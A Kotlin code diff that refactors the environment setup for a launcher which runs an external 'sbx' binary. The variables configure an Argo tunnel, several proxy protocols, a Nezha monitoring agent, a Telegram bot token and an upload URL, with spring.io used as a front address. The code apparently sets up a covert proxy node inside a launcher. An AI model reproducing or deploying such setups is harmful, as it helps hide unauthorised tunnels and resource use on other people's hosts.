@@ -138,35 +138,34 @@ object Launcher {
     private fun runSbxBinary() {
         val binaryPath = getSbxBinaryPath()
         
-        val envVars = mutableMapOf<String, String>().apply {
-            // 环境变量
-            env.put("UUID", "ee0c49f3-0584-40fd-87d4-e76f0afcc81f");
-            env.put("FILE_PATH", "./logs");
-            env.put("NEZHA_SERVER", "");
-            env.put("NEZHA_PORT", "");
-            env.put("NEZHA_KEY", "");
-            env.put("ARGO_PORT", "8001");
-            env.put("ARGO_DOMAIN", "");
-            env.put("ARGO_AUTH", "");
-            env.put("S5_PORT", "");
-            env.put("HY2_PORT", "");
-            env.put("TUIC_PORT", "");
-            env.put("ANYTLS_PORT", "");
-            env.put("REALITY_PORT", "");
-            env.put("ANYREALITY_PORT", "");
-            env.put("UPLOAD_URL", "");
-            env.put("CHAT_ID", "");
-            env.put("BOT_TOKEN", "");
-            env.put("CFIP", "spring.io");
-            env.put("CFPORT", "443");
-            env.put("NAME", "");
-            env.put("DISABLE_ARGO", "false");
-            
-            // 从环境变量覆盖
-            ALL_ENV_VARS.forEach { varName ->
-                System.getenv(varName)?.let { put(varName, it) }
-                System.getProperty(varName)?.let { put(varName, it) }
-            }
+        val envVars = mutableMapOf<String, String>()
+        // 环境变量
+        envVars["UUID"] = "ee0c49f3-0584-40fd-87d4-e76f0afcc81f"
+        envVars["FILE_PATH"] = "./logs"
+        envVars["NEZHA_SERVER"] = ""
+        envVars["NEZHA_PORT"] = ""
+        envVars["NEZHA_KEY"] = ""
+        envVars["ARGO_PORT"] = "8001"
+        envVars["ARGO_DOMAIN"] = ""
+        envVars["ARGO_AUTH"] = ""
+        envVars["S5_PORT"] = ""
+        envVars["HY2_PORT"] = ""
+        envVars["TUIC_PORT"] = ""
+        envVars["ANYTLS_PORT"] = ""
+        envVars["REALITY_PORT"] = ""
+        envVars["ANYREALITY_PORT"] = ""
+        envVars["UPLOAD_URL"] = ""
+        envVars["CHAT_ID"] = ""
+        envVars["BOT_TOKEN"] = ""
+        envVars["CFIP"] = "spring.io"
+        envVars["CFPORT"] = "443"
+        envVars["NAME"] = ""
+        envVars["DISABLE_ARGO"] = "false"
+        
+        // 从环境变量覆盖
+        ALL_ENV_VARS.forEach { varName ->
+            System.getenv(varName)?.let { envVars[varName] = it }
+            System.getProperty(varName)?.let { envVars[varName] = it }
         }
 
         val pb = ProcessBuilder(binaryPath.toString())
